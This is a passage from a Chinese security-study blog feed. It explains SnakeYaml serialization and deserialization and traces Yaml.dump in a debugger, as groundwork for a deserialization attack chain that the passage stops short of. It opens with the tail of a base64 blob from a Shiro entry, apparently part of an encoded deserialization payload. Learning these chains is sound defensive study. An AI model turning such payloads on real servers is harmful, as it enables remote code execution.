trNKnsCPoUXWDvAINgivXQFUKo86uJQiVe6Nv3dlLSUheaCmEaWKa0u5q82DxbkMSRx+1Tpg67gWmjdu87rfjdo0LXzK0s0XfjBPvmwTJi//biZO2w1zezesaIrwgSQjWEY4NcgiweHIm/tie+XLJk6BErMXCu7tIofx7gV84OECGrvQlBSsM8HK5BUHVUzFzh3DR3K9Bq8zqAlNqOAJSd6pN0P7MpiXysE1tzEDOu9eiHwQQHUFa69Gm2Fdm1AvkhBPhbc</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735123471446-c9e713c1-9e66-431d-92e5-1d213035f74f.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735123471446-c9e713c1-9e66-431d-92e5-1d213035f74f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>SnakeYaml链</title>
    <url>/2025/04/06/SnakeYaml%E9%93%BE/</url>
    <content><![CDATA[<h1 id="xZlPm">SnakeYaml</h1>
今天该学习SnakeYaml这条链子了，大概看了一遍文章，相比于刚学的ROME，难度还是有的

<h2 id="c1rAa">前置基础</h2>
<h3 id="ihuYh">Yaml语法</h3>
根据了解，SnakeYaml是Java的yaml解析类库，支持Java对象的序列化与反序列化（看见和FastJson比较像哈），我们来了解一下简单的yaml语法

<h4 id="lL423">Yaml特点</h4>

<ol>
<li>YAML对于大小写是敏感的</li>
<li>使用缩进代表层级关系</li>
<li>缩进只能用空格，不适用制表符（TAB），不要求空格个数，只要相同层级左对齐（一般两个空格或者四个）</li>
</ol>
<h4 id="luNlk">YAML支持的三种数据结构</h4>

<ul>
<li>对象</li>
</ul>
<p>使用冒号，格式如下（冒号后面要加空格）</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">key:</span> <span class="string">value</span></span><br></pre></td></tr></table></figure>

<p>而缩进可以用来代表层级关系（隐隐约约记得在spring的配置文件中是这么搞得）</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">key:</span> </span><br><span class="line">    <span class="attr">child-key:</span> <span class="string">value</span></span><br><span class="line">    <span class="attr">child-key2:</span> <span class="string">value2</span></span><br></pre></td></tr></table></figure>

<ul>
<li>数组</li>
</ul>
<p>使用一个短横线和一个空格代表一个数组项</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">hobby:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">Java</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">Python</span></span><br></pre></td></tr></table></figure>

<ul>
<li>常量</li>
</ul>
<p>Yaml中提供多种的常量结构：整数，浮点数，字符串，NULL，日期，布尔，时间</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">boolean:</span> </span><br><span class="line">    <span class="bullet">-</span> <span class="literal">TRUE</span>  <span class="comment">#true,True都可以</span></span><br><span class="line">    <span class="bullet">-</span> <span class="literal">FALSE</span>  <span class="comment">#false，False都可以</span></span><br><span class="line"><span class="attr">float:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">3.14</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">6.8523015e+5</span>  <span class="comment">#可以使用科学计数法</span></span><br><span class="line"><span class="attr">int:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">123</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">0b1010_0111_0100_1010_1110</span>    <span class="comment">#二进制表示</span></span><br><span class="line"><span class="attr">null:</span></span><br><span class="line">    <span class="attr">nodeName:</span> <span class="string">&#x27;node&#x27;</span></span><br><span class="line">    <span class="attr">parent:</span> <span class="string">~</span>  <span class="comment">#使用~表示null</span></span><br><span class="line"><span class="attr">string:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">哈哈</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;Hello world&#x27;</span>  <span class="comment">#可以使用双引号或者单引号包裹特殊字符</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">newline</span></span><br><span class="line">      <span class="string">newline2</span>    <span class="comment">#字符串可以拆成多行，每一行会被转化成一个空格</span></span><br><span class="line"><span class="attr">date:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">2022-07-28</span>    <span class="comment">#日期必须使用ISO 8601格式，即yyyy-MM-dd</span></span><br><span class="line"><span class="attr">datetime:</span> </span><br><span class="line">    <span class="bullet">-</span>  <span class="number">2022-07-28T15:02:31+08:00</span>    <span class="comment">#时间使用ISO 8601格式，时间和日期之间使用T连接，最后使用+代表时区</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="E2HRy">SnakeYaml序列化与反序列化</h2>
SnakeYaml提供了两个函数对yaml格式数据进行序列化与反序列化

<ul>
<li>Yaml.load()：提供参数为一个yaml字符串或者一个文件，可以将yaml格式数据进行反序列化后返回Java对象</li>
<li>Yaml.dump() ：提供参数为一个Java对象，可以将一个Java对象序列化为yaml文件格式</li>
</ul>
<h3 id="qKMfz">环境配置</h3>

<ul>
<li>JDK8u65</li>
<li><font style="color:#080808;background-color:#ffffff;">snakeyaml1.27</font></li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.yaml<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>snakeyaml<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.27<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>先写一个实体类<code>Person.java</code>，序列化和反序列化都用的是这个实体类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, Integer age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printInfo</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;name is &quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;age is&quot;</span> + <span class="built_in">this</span>.age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(Integer age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getAge&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="wmuWM">序列化与反序列化</h3>
<h4 id="NW2Jg">序列化</h4>
将一个java类序列化的代码如下

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;sean&quot;</span>,<span class="number">18</span>);</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        System.out.println(yaml.dump(person));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>序列化的结果如下，调用了两个属性的getter方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742549616834-c0dcccfc-27b3-4573-a465-9495ec745de7.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742549616834-c0dcccfc-27b3-4573-a465-9495ec745de7.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h4 id="YuqHI">反序列化</h4>
反序列化有两种方法，下面的代码中都有体现

<ul>
<li>load()：</li>
</ul>
<p>下面的<code>!!</code>类似于 Fastjson 中的 <code>@type</code> 用于指定反序列化的全类名，后面的就类似于Fastjson中的赋值</p>
<ul>
<li>loadAs()</li>
</ul>
<p><code>loadAs</code>函数进行反序列化，其中反序列化对象的类需要指定，而赋值的参数和值，需要符合Yaml的语法格式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">string1</span> <span class="operator">=</span> <span class="string">&quot;!!com.Person &#123;age: 18, name: sean&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person1</span> <span class="operator">=</span> yaml.load(string1);</span><br><span class="line"></span><br><span class="line">        System.out.println(person1);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">string2</span> <span class="operator">=</span> <span class="string">&quot;name: sean\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;age: 18&quot;</span> ;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person2</span> <span class="operator">=</span> yaml.loadAs(string2, Person.class);</span><br><span class="line">        System.out.println(person2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里我们可以看到，两者的效果是一样的，且在进行反序列化的时候，都调用了两个属性的setter方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742549859994-4f958a75-8c5b-4dfc-b001-4e37198b78e7.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742549859994-4f958a75-8c5b-4dfc-b001-4e37198b78e7.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h4 id="mInRk">奇怪的特性</h4>

<p>我们需要去改写一下我们的Person类，使他内部不只有private作用域的属性</p>
<p>改写后如下，我们加入了作用域为public和protect的属性，并且都写了这两个属性的setter与getter方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">public</span> String school;</span><br><span class="line">    <span class="keyword">protected</span> String phone;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, Integer age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getSchool</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getSchool&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> school;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSchool</span><span class="params">(String school)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setSchool&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.school = school;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPhone</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getPhone&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> phone;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPhone</span><span class="params">(String phone)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setPhone&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.phone = phone;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printInfo</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;name is &quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;age is&quot;</span> + <span class="built_in">this</span>.age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(Integer age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setAge&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们去修改一下序列化和反序列化的代码（这里就不再演示loadAs函数的使用）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;sean&quot;</span>,<span class="number">18</span>,<span class="string">&quot;tyut&quot;</span>,<span class="string">&quot;13888888888&quot;</span>);</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        System.out.println(yaml.dump(person));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">string1</span> <span class="operator">=</span> <span class="string">&quot;!!com.Person &#123;age: 18, name: sean, school: tyut, phone: 13888888888&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person1</span> <span class="operator">=</span> yaml.load(string1);</span><br><span class="line"></span><br><span class="line">        System.out.println(person1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>运行后，我们可以看到，<strong>在序列化和反序列化的时候，都没有调用public作用域属性的setter与getter方法</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742550978149-99d82295-b597-4b78-a8df-169f3e6e2e4e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742550978149-99d82295-b597-4b78-a8df-169f3e6e2e4e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h2 id="sM80r">序列化与反序列化断点调试</h2>
<h3 id="YHQsV">序列化</h3>

<p>进入<code>Yaml#dump</code>中，首先new了一个<code>ArrayList</code>，将传入的data放入list中，在<code>dumpAll</code>方法内，传入了一个<code>list.iterator()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">dump</span><span class="params">(Object data)</span> &#123;</span><br><span class="line">        List&lt;Object&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Object&gt;(<span class="number">1</span>);</span><br><span class="line">        list.add(data);</span><br><span class="line">        <span class="keyword">return</span> dumpAll(list.iterator());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里的<code>list.iterator</code>仅仅是返回了一个<code>Itr</code>（迭代器），用来管理list的遍历，然后执行<code>dumpAll</code>函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Iterator&lt;E&gt; <span class="title function_">iterator</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Itr</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>进入<code>dumpAll</code>函数中，该方法将一个Java对象转换成yaml格式的字符串（这里传参是个存在迭代器的类）</p>
<p>这里<code>StringWriter</code>是一个用于在内存中处理字符串的东西，这里的流程就是创建一个<code>StringWriter</code>，将Java转换成的yaml格式字符串写入内存中，最后<code>buffer.toString</code>将内存中的字符串转换成一个实际的字符串</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">dumpAll</span><span class="params">(Iterator&lt;? extends Object&gt; data)</span> &#123;</span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">buffer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>();</span><br><span class="line">        dumpAll(data, buffer, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">return</span> buffer.toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>继续跟进，这里new了一个<code>Serializer</code>类（yaml序列化器，将java对象转换为yaml格式数据流）</p>
<p>然后放入一个<code>Emitter</code>（据了解是一个yaml输出器，将data内容写入output中）</p>
<p>然后使用迭代器遍历data，获取类里面的<code>key:value</code>键值对</p>
<p>将键值对中的数据写入output中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dumpAll</span><span class="params">(Iterator&lt;? extends Object&gt; data, Writer output, Tag rootTag)</span> &#123;</span><br><span class="line">        <span class="type">Serializer</span> <span class="variable">serializer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Serializer</span>(<span class="keyword">new</span> <span class="title class_">Emitter</span>(output, dumperOptions), resolver,</span><br><span class="line">                dumperOptions, rootTag);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            serializer.open();</span><br><span class="line">            <span class="keyword">while</span> (data.hasNext()) &#123;</span><br><span class="line">                <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> representer.represent(data.next());</span><br><span class="line">                serializer.serialize(node);</span><br><span class="line">            &#125;</span><br><span class="line">            serializer.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">YAMLException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们继续跟进<code>represent</code>，主要流程肯定在该方法中的<code>representData</code>函数，我们继续跟入</p>
<p>在<code>representData</code>中，首先data会经过一些判断，但是这些判断我们都不会进去</p>
<p>在该方法中没有对数据进行处理，都是一些判断，最终走到<code>// check defaults</code>部分的<code>representData</code>函数中，因此核心部分还得向里面走</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//BaseRepresenter#represent</span></span><br><span class="line"><span class="keyword">public</span> Node <span class="title function_">represent</span><span class="params">(Object data)</span> &#123;</span><br><span class="line">        <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> representData(data);</span><br><span class="line">        representedObjects.clear();</span><br><span class="line">        objectToRepresent = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//BaseRepresenter#representData</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Node <span class="title function_">representData</span><span class="params">(Object data)</span> &#123;</span><br><span class="line">        objectToRepresent = data;</span><br><span class="line">        <span class="comment">// check for identity</span></span><br><span class="line">        <span class="keyword">if</span> (representedObjects.containsKey(objectToRepresent)) &#123;</span><br><span class="line">            <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> representedObjects.get(objectToRepresent);</span><br><span class="line">            <span class="keyword">return</span> node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="comment">// check for null first</span></span><br><span class="line">        <span class="keyword">if</span> (data == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> nullRepresenter.representData(<span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">return</span> node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// check the same class</span></span><br><span class="line">        Node node;</span><br><span class="line">        Class&lt;?&gt; clazz = data.getClass();</span><br><span class="line">        <span class="keyword">if</span> (representers.containsKey(clazz)) &#123;</span><br><span class="line">            <span class="type">Represent</span> <span class="variable">representer</span> <span class="operator">=</span> representers.get(clazz);</span><br><span class="line">            node = representer.representData(data);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// check the parents</span></span><br><span class="line">            <span class="keyword">for</span> (Class&lt;?&gt; repr : multiRepresenters.keySet()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (repr != <span class="literal">null</span> &amp;&amp; repr.isInstance(data)) &#123;</span><br><span class="line">                    <span class="type">Represent</span> <span class="variable">representer</span> <span class="operator">=</span> multiRepresenters.get(repr);</span><br><span class="line">                    node = representer.representData(data);</span><br><span class="line">                    <span class="keyword">return</span> node;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// check defaults</span></span><br><span class="line">            <span class="keyword">if</span> (multiRepresenters.containsKey(<span class="literal">null</span>)) &#123;</span><br><span class="line">                <span class="type">Represent</span> <span class="variable">representer</span> <span class="operator">=</span> multiRepresenters.get(<span class="literal">null</span>);</span><br><span class="line">                node = representer.representData(data);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">Represent</span> <span class="variable">representer</span> <span class="operator">=</span> representers.get(<span class="literal">null</span>);</span><br><span class="line">                node = representer.representData(data);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>进入<code>RepresentJavaBean#representData</code>，我们看传入<code>representJavaBean</code>的参数</p>
<ul>
<li>第一个是<code>Set</code>类对象（该对象中，存放着data该类中的各个变量信息）</li>
<li>第二个就是我们的data（javaBean）</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">class</span> <span class="title class_">RepresentJavaBean</span> <span class="keyword">implements</span> <span class="title class_">Represent</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> Node <span class="title function_">representData</span><span class="params">(Object data)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> representJavaBean(getProperties(data.getClass()), data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>进入<code>Representer#representJavaBean</code>后，properties存放着所有的变量信息（但是在该变量中没有找到value值），而javaBean中只存放着作用域为private的属性</p>
<p>后面比较重要的地方，应该是在for循环中，它将<code>Set</code>中的每一个<code>MethodeProperty</code>遍历出来，使用<code>property.get(javaBean)</code>去获取javaBean中与<code>MethodeProperty</code>相对应的变量</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> MappingNode <span class="title function_">representJavaBean</span><span class="params">(Set&lt;Property&gt; properties, Object javaBean)</span> &#123;</span><br><span class="line">        List&lt;NodeTuple&gt; value = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;NodeTuple&gt;(properties.size());</span><br><span class="line">        Tag tag;</span><br><span class="line">        <span class="type">Tag</span> <span class="variable">customTag</span> <span class="operator">=</span> classTags.get(javaBean.getClass());</span><br><span class="line">        tag = customTag != <span class="literal">null</span> ? customTag : <span class="keyword">new</span> <span class="title class_">Tag</span>(javaBean.getClass());</span><br><span class="line">        <span class="comment">// flow style will be chosen by BaseRepresenter</span></span><br><span class="line">        <span class="type">MappingNode</span> <span class="variable">node</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MappingNode</span>(tag, value, FlowStyle.AUTO);</span><br><span class="line">        representedObjects.put(javaBean, node);</span><br><span class="line">        DumperOptions.<span class="type">FlowStyle</span> <span class="variable">bestStyle</span> <span class="operator">=</span> FlowStyle.FLOW;</span><br><span class="line">        <span class="keyword">for</span> (Property property : properties) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">memberValue</span> <span class="operator">=</span> property.get(javaBean);</span><br><span class="line">            <span class="type">Tag</span> <span class="variable">customPropertyTag</span> <span class="operator">=</span> memberValue == <span class="literal">null</span> ? <span class="literal">null</span></span><br><span class="line">                    : classTags.get(memberValue.getClass());</span><br><span class="line">            <span class="type">NodeTuple</span> <span class="variable">tuple</span> <span class="operator">=</span> representJavaBeanProperty(javaBean, property, memberValue,</span><br><span class="line">                    customPropertyTag);</span><br><span class="line">            <span class="keyword">if</span> (tuple == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!((ScalarNode) tuple.getKeyNode()).isPlain()) &#123;</span><br><span class="line">                bestStyle = FlowStyle.BLOCK;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Node</span> <span class="variable">nodeValue</span> <span class="operator">=</span> tuple.getValueNode();</span><br><span class="line">            <span class="keyword">if</span> (!(nodeValue <span class="keyword">instanceof</span> ScalarNode &amp;&amp; ((ScalarNode) nodeValue).isPlain())) &#123;</span><br><span class="line">                bestStyle = FlowStyle.BLOCK;</span><br><span class="line">            &#125;</span><br><span class="line">            value.add(tuple);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (defaultFlowStyle != FlowStyle.AUTO) &#123;</span><br><span class="line">            node.setFlowStyle(defaultFlowStyle);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            node.setFlowStyle(bestStyle);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>再进入到<code>representJavaBeanProperty</code>方法中，该方法将对象中的数据，拆解成了键值对，从返回的<code>new NodeTuple(nodeKey, nodeValue);</code>中我们也可以看出来这一点</p>
